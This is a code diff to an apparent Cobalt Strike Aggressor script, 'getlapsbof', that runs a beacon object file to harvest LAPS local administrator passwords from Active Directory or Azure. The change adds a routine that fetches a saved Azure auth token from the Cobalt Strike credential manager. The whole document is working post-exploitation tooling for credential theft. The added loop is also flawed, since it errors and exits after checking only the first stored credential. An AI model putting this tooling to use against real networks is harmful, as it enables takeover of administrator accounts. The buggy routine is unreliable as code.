@@ -48,8 +48,13 @@ alias getlapsbof {
     
         $at = $3;
         $dev = $4;
+        
+        if (!$at) {
+            $at = get_saved_azcred($1);
+        }
+        
         $atsnip = " " . left($at, 18);
-        $args = bof_pack($1, "zzzz", $lapsmode, $at, $dev, $atsnip);
+        $args = bof_pack($1, "zzzz", $lapsmode, $at, $dev, $atsnip);        
         
         blog2($1, "\cDAZ LAPS\o Mode");
         blog2($1, "AuthToken: $+ $atsnip $+ <snipped>");
@@ -62,17 +67,37 @@ alias getlapsbof {
         $dnobject = $5;
         $args = bof_pack($1, "zzzz", $lapsmode, $server, $dn, $dnobject);
     
-    	blog2($1, "\cDAD LAPS\o Mode");
+        blog2($1, "\cDAD LAPS\o Mode");
         blog2($1, "Target DC: $server");
         blog2($1, "Target Base DN: $dn");
         blog2($1, "Target Computer DN: $dnobject");
     } else {
     
-    	berror($1, "getlapsbof - UNKNOWN LAPS MODE");
-	return;    	
+        berror($1, "getlapsbof - UNKNOWN LAPS MODE");
+        return;     
     
     }
     
     beacon_inline_execute($1, $data, "go", $args);
+
+}
+
+
+# Search Cobalt Strike Credential Manager for operator saved Azure auth and return it.
+sub get_saved_azcred { 
+    local('$credmgr $secret');
+
+    foreach $cred (credentials()) {
+    
+        if ($cred["user"] eq "_getlapsbof_aztoken") {
+        
+            blog2($1, "Using saved Azure authentication token");
+            $secret = $cred["password"];
+            return $secret;
+        }
+    
+        berror($1, "No Azure authentication token provided.");
+        exit();
+    }
 
 }
